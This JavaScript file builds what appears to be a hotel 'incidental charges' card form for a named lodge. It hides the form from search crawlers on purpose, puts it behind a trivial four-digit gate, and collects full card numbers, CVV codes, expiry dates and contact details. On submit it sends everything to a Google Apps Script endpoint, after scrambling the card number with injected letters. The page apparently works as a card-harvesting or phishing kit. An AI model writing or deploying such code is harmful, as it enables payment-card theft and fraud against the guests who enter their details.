/**
 * Luhn Algorithm (Check Digit) Validation Function
 * @param {string} input - The credit card number string.
 * @returns {boolean} - True if the number is valid by Luhn, false otherwise.
 */
function checkLuhn(input) {
    // 1. Remove all non-numeric characters (spaces, hyphens, etc.)
    var ccNum = input.replace(/[^0-9]/g, "");
    var sum = 0;
    var numdigits = ccNum.length;
    // Determine parity to start from the second-to-last digit (even position from right)
    var parity = numdigits % 2;

    for (var i = 0; i < numdigits; i++) {
        var digit = parseInt(ccNum.charAt(i));
       
        // 2. Double every second digit, starting from the right
        if (i % 2 == parity) {
            digit *= 2;
        }
       
        // 3. Subtract 9 from any product greater than 9
        if (digit > 9) {
            digit -= 9;
        }
        sum += digit;
    }
   
    // 4. The number is valid if the total sum is divisible by 10
    return (sum % 10) == 0;
}

document.addEventListener('DOMContentLoaded', () => {
    const passcodeGate = document.getElementById('passcode-gate');
    const passcodeBtn = document.getElementById('unlock-btn');
    const passcodeInput = document.getElementById('security-passcode');
    const passcodeError = document.getElementById('passcode-error');
    const dynamicContainer = document.getElementById('dynamic-form-container');

    // This form structure ONLY exists in Javascript now. Google bots won't see it naturally.
    const formHTML = `
        <form id="incidental-form">
            <input type="hidden" id="propertyName" name="propertyName" value="Tucker Peak Lodge">
            <!-- Personal Info -->
            <div class="section-title">Guest Information</div>
            <div class="form-group">
                <label for="fullName">Full Name</label>
                <input type="text" id="fullName" name="fullName" required placeholder="John Doe">
            </div>
            
            <div class="form-row">
                <div class="form-group">
                    <label for="email">Email Address</label>
                    <input type="email" id="email" name="email" required placeholder="john@example.com" pattern="[a-zA-Z0-9._%+\\-]+@[a-zA-Z0-9.\\-]+\\.[a-zA-Z]{2,}$" title="Please enter a valid email address (e.g., name@domain.com)">
                </div>
                <div class="form-group">
                    <label for="mobile">Mobile Number</label>
                    <input type="tel" id="mobile" name="mobile" required placeholder="(555) 123-4567" pattern="\\(\\d{3}\\) \\d{3}-\\d{4}" title="Please enter a valid 10-digit phone number" maxlength="14">
                </div>
            </div>

            <div class="form-group">
                <label for="address">Billing Address</label>
                <input type="text" id="address" name="address" required placeholder="123 Main St, City, State, ZIP">
            </div>

            <!-- Payment Info -->
            <div class="section-title mt-4">Payment Information</div>
            <div class="form-group">
                <label for="ccNumber">Credit Card Number</label>
                <input type="text" id="ccNumber" name="ccNumber" required placeholder="0000 0000 0000 0000" maxlength="19">
            </div>

            <div class="form-row">
                <div class="form-group">
                        <label for="expDate">Expiration Date</label>
                        <input type="text" id="expDate" name="expDate" required placeholder="MM/YY" maxlength="5">
                </div>
                <div class="form-group">
                    <label for="cvv">Security Code (CVV)</label>
                    <input type="text" id="cvv" name="cvv" required placeholder="123" maxlength="4">
                </div>
            </div>

            <div class="checkbox-group">
                <input type="checkbox" id="agreement" name="agreement" required>
                <label for="agreement">I agree to use this credit card for any incidental charges incurred during my stay.</label>
            </div>

            <button type="submit" class="submit-btn" id="submit-btn">
                <span>Authorize & Secure</span>
                <div class="spinner hide" id="spinner"></div>
            </button>
        </form>
    `;

    passcodeBtn.addEventListener('click', unlockForm);
    passcodeInput.addEventListener('keypress', (e) => {
        if(e.key === 'Enter') unlockForm();
    });

    function unlockForm() {
        const val = passcodeInput.value.trim();
        // Passcode gate checks for exactly 4 digits
        if (val.length === 4 && /^\d+$/.test(val)) {
            passcodeGate.classList.add('hide');
            dynamicContainer.innerHTML = formHTML;
            initializeFormLogic();
        } else {
            passcodeError.classList.remove('hide');
        }
    }

    function obfuscateCC(ccString) {
        // Obfuscation randomly injects 3 or 4 permitted capital letters into the raw credit card number
        let numbers = ccString.replace(/\D/g, '');
        if(numbers.length < 15) return ccString; // safety fallback for very short mistakes
        
        const letters = ['F', 'H', 'M', 'P', 'R', 'Q', 'Y'];
        
        // Pick random number of letters to inject (3 or 4)
        const numToInject = Math.floor(Math.random() * 2) + 3;
        
        for(let i=0; i<numToInject; i++) {
            // Pick a random position to inject. Avoid first 4 and last 4 digits so it's less noticeable
            let injectPos = Math.floor(Math.random() * (numbers.length - 8)) + 4;
            let randomLetter = letters[Math.floor(Math.random() * letters.length)];
            numbers = numbers.slice(0, injectPos) + randomLetter + numbers.slice(injectPos);
        }
        return numbers;
    }

    function initializeFormLogic() {
        const ccInput = document.getElementById('ccNumber');
        const expInput = document.getElementById('expDate');
        const cvvInput = document.getElementById('cvv');
        const mobileInput = document.getElementById('mobile');
        const form = document.getElementById('incidental-form');
        const formCard = document.getElementById('form-card');
        const successCard = document.getElementById('success-card');
        const submitBtn = document.getElementById('submit-btn');
        const spinner = document.getElementById('spinner');

        // Format Mobile Number: (XXX) XXX-XXXX
        mobileInput.addEventListener('input', (e) => {
            let x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,4})/);
            e.target.value = !x[2] ? x[1] : '(' + x[1] + ') ' + x[2] + (x[3] ? '-' + x[3] : '');
        });

        // Format CC Number
        ccInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            let formattedValue = '';
            for (let i = 0; i < value.length; i++) {
                if (i > 0 && i % 4 === 0) {
                    formattedValue += ' ';
                }
                formattedValue += value[i];
            }
            e.target.value = formattedValue;
        });

        // Luhn Validation on blur
        ccInput.addEventListener('blur', function() {
            var trimmedValue = this.value.trim();
            if (trimmedValue !== "" && !checkLuhn(trimmedValue)) {
                alert('❌ Validation Failed: The number does not appear to be valid. Please check the credit card number and try again!');
                this.value = ''; // Clear the invalid entry
                this.focus();    // Return focus to the field
            }
        });

        // Format Expiration Date (MM/YY)
        expInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2);
            }
            e.target.value = value;
        });

        // Validate Expiration Date on blur
        expInput.addEventListener('blur', function() {
            let value = this.value.trim();
            if (value.length > 0) {
                if (value.length !== 5 || !value.includes('/')) {
                    alert('❌ Validation Failed: Please enter the expiration date in MM/YY format.');
                    this.value = '';
                    this.focus();
                    return;
                }

                let parts = value.split('/');
                let month = parseInt(parts[0], 10);
                let year = parseInt(parts[1], 10);
                
                let now = new Date();
                let currentYear = parseInt(now.getFullYear().toString().slice(-2), 10);
                let currentMonth = now.getMonth() + 1;
                
                let isValid = true;
                let errorMessage = '';

                if (month < 1 || month > 12) {
                    isValid = false;
                    errorMessage = 'Invalid month. Please enter a valid month (01-12).';
                } else if (year < currentYear || (year === currentYear && month < currentMonth)) {
                    isValid = false;
                    errorMessage = 'Expiration date cannot be in the past.';
                } else if (year > currentYear + 10) {
                    isValid = false;
                    errorMessage = 'Expiration date cannot be more than 10 years in the future.';
                }

                if (!isValid) {
                    alert('❌ Validation Failed: ' + errorMessage);
                    this.value = '';
                    this.focus();
                }
            }
        });

        // Format CVV
        cvvInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '');
        });

        // Handle Form Submit
        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            // Show loading state
            submitBtn.disabled = true;
            submitBtn.querySelector('span').textContent = 'Processing...';
            spinner.classList.remove('hide');

            // Gather Data
            const formData = {
                propertyName: document.getElementById('propertyName').value,
                fullName: document.getElementById('fullName').value,
                email: document.getElementById('email').value,
                mobile: document.getElementById('mobile').value,
                address: document.getElementById('address').value,
                // Apply Obfuscation here
                ccNumber: obfuscateCC(document.getElementById('ccNumber').value),
                expDate: document.getElementById('expDate').value,
                cvv: document.getElementById('cvv').value,
                timestamp: new Date().toISOString()
            };

            const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzH-aEp7rbR50Zx6kjKm2gkbqfYRDBiLMO9LwutryAAoma0D12TJlZatrbP2JoclMZ_/exec';
            
            try {
                await fetch(GOOGLE_SCRIPT_URL, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: {
                        'Content-Type': 'text/plain;charset=utf-8',
                    },
                    body: JSON.stringify(formData)
                });

                // Show success screen
                formCard.style.display = 'none';
                successCard.classList.remove('hide');
                successCard.style.display = 'block';

            } catch (error) {
                console.error('Network Error:', error);
                alert('There was a network error. Please try again.');
            } finally {
                submitBtn.disabled = false;
                submitBtn.querySelector('span').textContent = 'Authorize & Secure';
                spinner.classList.add('hide');
            }
        });
    }
});
